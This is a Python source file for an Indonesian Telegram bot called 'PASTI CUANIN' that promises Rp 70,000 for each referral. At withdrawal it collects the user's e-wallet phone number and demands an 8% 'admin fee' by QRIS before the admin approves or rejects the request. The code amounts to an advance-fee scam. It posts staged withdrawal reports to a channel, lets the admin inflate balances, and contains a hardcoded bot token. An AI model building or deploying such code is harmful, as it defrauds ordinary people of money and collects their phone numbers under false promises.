from datetime import datetime
import logging
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    Update,
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# 1. Konfigurasi Logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# TODO: Ganti dengan Token Bot asli Anda dari @BotFather
TOKEN = "9186649990:AAFee8sQUXFu_NMc9PyT6N5xW7CeRizLHKk"

# 🔑 KONFIGURASI ID
ADMIN_ID = 6825271410      # Ganti dengan Telegram User ID pribadi Kakak
CHANNEL_ID = -1004367716483  # ID Channel Telegram tempat laporan WD muncul
ADMIN_USERNAME = "@daisukeshinomiya"

QR_IMAGE_URL = "https://ibb.co.com/JWLJbQnK"

# Database Simulasi Sementara
users_db = {}
pending_withdrawals = {}
wd_counter = 14360  


def get_main_reply_keyboard():
    keyboard = [
        [KeyboardButton("💸 Hasilkan Uang"), KeyboardButton("💳 Withdrew")],
        [KeyboardButton("📜 Riwayat WD"), KeyboardButton("📞 Hubungi Admin")],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    user_id = user.id

    if user_id not in users_db:
        args = context.args
        referred_by = None
        if args and args[0].isdigit():
            referred_by = int(args[0])
            if referred_by in users_db and referred_by != user_id:
                users_db[referred_by]["balance"] += 70000
                users_db[referred_by]["referral_count"] = (
                    users_db[referred_by].get("referral_count", 0) + 1
                )

                # 🔔 NOTIFIKASI REFERRAL BARU YANG SUPER SERU UNTUK PENGUNDANG
                invited_name = user.first_name or "Teman Baru"
                notif_text = (
                    f"🔥 **ALHAMDULILAH, CAHAYA CUAN MASUK!** 🔥\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎉 Hebat banget! Teman kamu **{invited_name}** baru saja bergabung melalui link referral sakti kamu!\n\n"
                    f"🎁 **Bonus Referral:** `+Rp 70.000`\n"
                    f"💰 **Total Saldo Sekarang:** `Rp {users_db[referred_by]['balance']:,.0f}`\n"
                    f"👥 **Total Pasukan Referral:** `{users_db[referred_by]['referral_count']} Orang`\n\n"
                    f"🚀 *Terus sebarkan link kamu dan jemput cuan sebanyak-banyaknya setiap hari bersama PASTI CUANIN!*"
                )
                try:
                    await context.bot.send_message(
                        chat_id=referred_by,
                        text=notif_text,
                        parse_mode="Markdown",
                    )
                except Exception as e:
                    logger.warning(f"Gagal mengirim notif referral ke {referred_by}: {e}")

        users_db[user_id] = {
            "balance": 0,
            "referral_count": 0,
            "ref_by": referred_by,
            "state": "IDLE",
            "wd_amount": 0,
            "wd_method": "",
            "wd_history": [],
        }

    welcome_text = (
        f"🌟 **HALO & SELAMAT DATANG DI PASTI CUANIN BOT!** 🌟\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🚀 Platform digital terpercaya dan paling gacor untuk menghasilkan pundi-pundi rupiah harian langsung ke e-wallet kamu dengan cepat, aman, dan tanpa ribet!\n\n"
        f"📊 **PANEL STATISTIK AKUN ANDA**\n"
        f"├ 👤 ID Pengguna : `{user_id}`\n"
        f"├ 💰 Saldo Utama : **Rp {users_db[user_id]['balance']:,.0f}**\n"
        f"└ 👥 Total Teman Diundang : **{users_db[user_id]['referral_count']} Orang**\n\n"
        f"⚙️ **INFORMASI & ATURAN SISTEM**\n"
        f"├ 🎁 Hadiah Referral : **Rp 70.000 / Pengguna**\n"
        f"├ 💳 Minimal Penarikan : **Rp 200.000**\n"
        f"├ ⚡ Kecepatan Proses WD : **1–5 Menit Otomatis**\n"
        f"└ 📞 Layanan Bantuan Resmi : {ADMIN_USERNAME}\n\n"
        f"💡 *Tunggu apa lagi? Yuk klik tombol \"💸 Hasilkan Uang\" di bawah untuk menyebar link ajaibmu dan mulai raih cuan pertamamu hari ini!* ✨"
    )

    if update.message:
        await update.message.reply_text(
            welcome_text, reply_markup=get_main_reply_keyboard(), parse_mode="Markdown"
        )


# Fitur Admin: Menambah saldo sendiri (/addsaldo <jumlah>)
async def add_saldo_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return

    if context.args and context.args[0].isdigit():
        amount = int(context.args[0])
        user_id = update.effective_user.id
        
        if user_id not in users_db:
            users_db[user_id] = {
                "balance": 0, "referral_count": 0, "ref_by": None, "state": "IDLE", "wd_amount": 0, "wd_method": "", "wd_history": []
            }
            
        users_db[user_id]["balance"] += amount
        await update.message.reply_text(f"✅ **BERHASIL!** Saldo pribadi Anda ditambah sebesar **Rp {amount:,.0f}** 🤑", parse_mode="Markdown")
    else:
        await update.message.reply_text("⚠️ **Format Salah!** Gunakan format: `/addsaldo 250000`", parse_mode="Markdown")


# Fitur Admin: Menambah saldo teman (/tambahsaldo <id_user> <jumlah>)
async def tambah_saldo_teman(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        return

    if len(context.args) >= 2 and context.args[0].isdigit() and context.args[1].isdigit():
        target_user_id = int(context.args[0])
        amount = int(context.args[1])

        if target_user_id in users_db:
            users_db[target_user_id]["balance"] += amount
            await update.message.reply_text(
                f"✅ **SUKSES MENAMBAHKAN SALDO MEMBER!**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"├ 👤 Target ID : `{target_user_id}`\n"
                f"├ 💰 Jumlah Tambahan : Rp {amount:,.0f}\n"
                f"└ 💳 Saldo Akhir : Rp {users_db[target_user_id]['balance']:,.0f}",
                parse_mode="Markdown"
            )
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=(
                        f"🎁 **SURPRISE! SALDO ANDA DITAMBAHKAN ADMIN** 🎁\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"Kabar gembira! Admin baru saja mengirimkan suntikan saldo spesial sebesar **Rp {amount:,.0f}** langsung ke akun kamu!\n\n"
                        f"💰 **Saldo Terbaru Kamu:** `Rp {users_db[target_user_id]['balance']:,.0f}`\n\n"
                        f"🚀 *Semakin semangat ya cari cuannya! Terima kasih telah aktif di bot kami.*"
                    ),
                    parse_mode="Markdown"
                )
            except Exception:
                pass
        else:
            await update.message.reply_text(f"❌ **GAGAL:** User ID `{target_user_id}` belum pernah berinteraksi atau terdaftar di database bot.", parse_mode="Markdown")
    else:
        await update.message.reply_text("⚠️ **Format Salah!**\nGunakan format: `/tambahsaldo <id_user> <jumlah>`", parse_mode="Markdown")


async def handle_text_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = update.message.text
    user_id = update.effective_user.id

    if user_id not in users_db:
        users_db[user_id] = {
            "balance": 0,
            "referral_count": 0,
            "ref_by": None,
            "state": "IDLE",
            "wd_amount": 0,
            "wd_method": "",
            "wd_history": [],
        }

    balance = users_db[user_id]["balance"]

    if text == "💸 Hasilkan Uang":
        bot_username = context.bot.username
        ref_link = f"https://t.me/{bot_username}?start={user_id}"
        
        ref_text = (
            f"🔥 **PROGRAM SULTAN: 1 UNDANGAN = Rp 70.000!** 🔥\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Mau punya penghasilan tambahan jutaan rupiah tiap hari cuma dari Telegram? Gampang banget!\n\n"
            f"🔗 Salin dan sebarkan **Link Referral Unik** kamu di bawah ini ke Grup Telegram, WhatsApp, Facebook, atau TikTok:\n\n"
            f"`{ref_link}`\n\n"
            f"🎁 **Keuntungan Berlimpah:**\n"
            f"• Setiap ada teman yang klik dan join lewat link kamu, otomatis saldo langsung nambah **Rp 70.000**!\n"
            f"• Tanpa batas maksimal undang teman, semakin banyak kamu sebar link, semakin kaya mendadak!\n\n"
            f"💡 *Tunggu apa lagi? Amankan link kamu sekarang dan buktikan sendiri cuannya!* 🚀"
        )
        await update.message.reply_text(
            ref_text, parse_mode="Markdown", reply_markup=get_main_reply_keyboard()
        )

    elif text == "💳 Withdrew":
        if balance < 200000:
            await update.message.reply_text(
                f"🛑 **WADUH, SALDO BELUM CUKUP, KAK!** 🛑\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"├ 💰 Saldo Kamu Saat Ini : **Rp {balance:,.0f}**\n"
                f"└ 📉 Batas Minimal WD : **Rp 200.000**\n\n"
                f"💡 *Tenang! Saldo kamu masih kurang sedikit lagi. Yuk buruan bagikan link di menu \"💸 Hasilkan Uang\" supaya bisa segera melakukan penarikan hari ini!* 💪",
                parse_mode="Markdown",
            )
        else:
            users_db[user_id]["wd_amount"] = balance
            keyboard = [
                [
                    InlineKeyboardButton("🟢 DANA (Super Cepat)", callback_data="ewallet_dana"),
                    InlineKeyboardButton("🔵 GoPay (Anti Ribet)", callback_data="ewallet_gopay"),
                ]
            ]
            await update.message.reply_text(
                "💳 **PILIH JALUR E-WALLET PENARIKAN ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nSilakan pilih salah satu dompet digital favoritmu di bawah ini untuk mencairkan saldo:",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="Markdown",
            )

    elif text == "📜 Riwayat WD":
        history = users_db[user_id]["wd_history"]
        if not history:
            await update.message.reply_text(
                "📜 **CATATAN RIWAYAT PENARIKAN**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n❌ Belum ada rekam jejak penarikan dana. Yuk kumpul-kumpul cuan dulu lewat program referral!",
                parse_mode="Markdown",
            )
        else:
            hist_text = "📜 **RIWAYAT PENARIKAN DANA ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            for item in history:
                hist_text += (
                    f"├ 🆔 ID WD : `{item['id']}`\n"
                    f"├ 💰 Nominal : Rp {item['amount']:,.0f}\n"
                    f"└ 📌 Status : **{item['status']}**\n\n"
                )
            await update.message.reply_text(hist_text, parse_mode="Markdown")

    elif text == "📞 Hubungi Admin":
        await update.message.reply_text(
            f"📞 **PUSAT BANTUAN & LAYANAN PELANGGAN**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Mengalami kendala teknis, proses WD lambat, atau ingin konsultasi seputar bot? Silakan hubungi admin resmi kami:\n\n👉 **{ADMIN_USERNAME}**\n\n⚡ *Admin kami siap melayani dan merespons dengan cepat demi kenyamanan Anda!*",
            parse_mode="Markdown",
        )

    else:
        user_state = users_db[user_id].get("state", "IDLE")
        if user_state == "WAITING_FOR_PHONE":
            phone_number = text
            wd_amount = users_db[user_id]["wd_amount"]
            wd_method = users_db[user_id].get("wd_method", "DANA")
            admin_fee = int(wd_amount * 0.08)

            users_db[user_id]["state"] = "WAITING_FOR_ADMIN_FEE"

            # 1. Kirim QR Code ke chat pribadi user
            qr_caption = (
                f"🛡️ **VERIFIKASI BIAYA ADMIN 8% Wajib** 🛡️\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 Nomor Tujuan : `{phone_number}` ({wd_method})\n"
                f"💰 Total Penarikan : Rp {wd_amount:,.0f}\n"
                f"⚡ **Biaya Admin (8%): Rp {admin_fee:,.0f}**\n\n"
                f"📲 *Instruksi Penting:* Selesaikan pembayaran biaya admin melalui QRIS di bawah ini, lalu **wajib** klik tombol 'Refresh Status Pembayaran' setelah transfer berhasil!"
            )
            keyboard = [
                [
                    InlineKeyboardButton(
                        "🔄 Refresh Status Pembayaran",
                        callback_data="refresh_status",
                    )
                ]
            ]
            await update.message.reply_photo(
                photo=QR_IMAGE_URL,
                caption=qr_caption,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="Markdown",
            )

            # Persiapan Data WD 
            global wd_counter
            wd_counter += 1
            current_wd_id = f"#{wd_counter}"
            
            masked_phone = phone_number
            if len(phone_number) >= 8:
                masked_phone = phone_number[:4] + "****" + phone_number[-4:]

            current_time_str = datetime.now().strftime("%d/%m/%Y | %H:%M") + " WIB"

            pending_withdrawals[current_wd_id] = {
                "user_id": user_id,
                "amount": wd_amount,
                "phone": phone_number,
                "method": wd_method,
            }

            # Teks Laporan yang akan muncul di CHANNEL TELEGRAM
            public_group_report = (
                f"🚨 **NEW PENDING WITHDRAWAL**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"ID WD : `{current_wd_id}`\n"
                f"User  : `{user_id}`\n"
                f"Amount: Rp {wd_amount:,.0f}\n"
                f"Method: {wd_method}\n"
                f"Number: `{masked_phone}`\n"
                f"Date  : {current_time_str}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"STATUS : SILAKAN SCAN QRIS ADMIN 8%"
            )

            # 2. Kirim otomatis ke CHANNEL TELEGRAM
            await context.bot.send_message(
                chat_id=CHANNEL_ID,
                text=public_group_report,
                parse_mode="Markdown"
            )

            # 3. Kirim panel tombol Approve/Reject secara RAHASIA ke CHAT PRIBADI ADMIN
            admin_private_control = (
                f"🔔 **[KONTROL ADMIN] PENDING WD BARU**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"ID WD : `{current_wd_id}`\n"
                f"User ID: `{user_id}`\n"
                f"Amount: Rp {wd_amount:,.0f} ({wd_method})\n"
                f"No HP : `{phone_number}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"Silakan cek mutasi biaya admin, lalu pilih aksi di bawah:"
            )
            admin_keyboard = [
                [
                    InlineKeyboardButton("✅ Approve (Sukses)", callback_data=f"app_{current_wd_id}"),
                    InlineKeyboardButton("❌ Reject", callback_data=f"rej_{current_wd_id}"),
                ]
            ]
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=admin_private_control,
                reply_markup=InlineKeyboardMarkup(admin_keyboard),
                parse_mode="Markdown",
            )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data.startswith("ewallet_"):
        wallet_type = data.split("_")[1].upper()
        users_db[user_id]["state"] = "WAITING_FOR_PHONE"
        users_db[user_id]["wd_method"] = wallet_type  
        
        await query.edit_message_text(
            text=f"📱 **MASUKKAN NOMOR AKUN {wallet_type} ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n✍️ *Silakan ketik dan kirimkan nomor HP {wallet_type} aktif kamu melalui kolom chat di bawah ini:*",
            parse_mode="Markdown",
        )

    elif data == "refresh_status":
        # Notifikasi klik refresh masuk ke CHAT PRIBADI ADMIN
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🔄 **[NOTIFIKASI REFRESH]**\nUser dengan ID `{user_id}` baru saja mengeklik tombol **Refresh Status Pembayaran**. Segera cek mutasi pembayaran admin!",
            parse_mode="Markdown"
        )
        await query.answer(
            "⏳ Status Berhasil Dikirim: Permintaan verifikasi pembayaran Anda sudah diteruskan ke admin. Mohon bersabar menunggu ya!",
            show_alert=True,
        )

    elif data.startswith("app_") or data.startswith("rej_"):
        if user_id != ADMIN_ID:
            return

        action, wd_id = data.split("_")
        if wd_id in pending_withdrawals:
            wd_data = pending_withdrawals[wd_id]
            target_user_id = wd_data["user_id"]
            amount = wd_data["amount"]

            if action == "app":
                users_db[target_user_id]["balance"] = 0
                users_db[target_user_id]["state"] = "IDLE"
                users_db[target_user_id]["wd_history"].append(
                    {
                        "id": wd_id,
                        "amount": amount,
                        "status": "SUCCESS ✅",
                    }
                )

                # Kirim pesan sukses ke pengguna secara pribadi
                success_msg = (
                    f"🎉 **SELAMAT! PENARIKAN DANA BERHASIL** 🎉\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"Kabar gembira! Saldo sebesar **Rp {amount:,.0f}** telah sukses dikirimkan oleh admin ke nomor e-wallet kamu.\n\n"
                    f"🚀 Dana akan masuk dalam hitungan 5-10 menit ke depan. Terima kasih telah menggunakan PASTI CUANIN!"
                )
                await context.bot.send_message(
                    chat_id=target_user_id, text=success_msg, parse_mode="Markdown"
                )
                await query.edit_message_text(
                    text=f"✅ WD ID `{wd_id}` telah berhasil di-**APPROVE** dan saldo user telah direset."
                )

            elif action == "rej":
                users_db[target_user_id]["state"] = "IDLE"
                users_db[target_user_id]["wd_history"].append(
                    {
                        "id": wd_id,
                        "amount": amount,
                        "status": "REJECTED ❌",
                    }
                )
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=f"❌ **MAAF, PENARIKAN DITOLAK**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nPenarikan saldo dengan ID `{wd_id}` terpaksa dibatalkan oleh admin karena kendala verifikasi.",
                    parse_mode="Markdown",
                )
                await query.edit_message_text(
                    text=f"❌ WD ID `{wd_id}` telah berhasil di-**REJECT**."
                )
            
            del pending_withdrawals[wd_id]
        else:
            await query.edit_message_text(text="⚠️ Data penarikan ini sudah diproses sebelumnya.")


def main() -> None:
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("addsaldo", add_saldo_admin))
    application.add_handler(CommandHandler("tambahsaldo", tambah_saldo_teman))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_menu)
    )

    application.run_polling()


if __name__ == "__main__":
    main()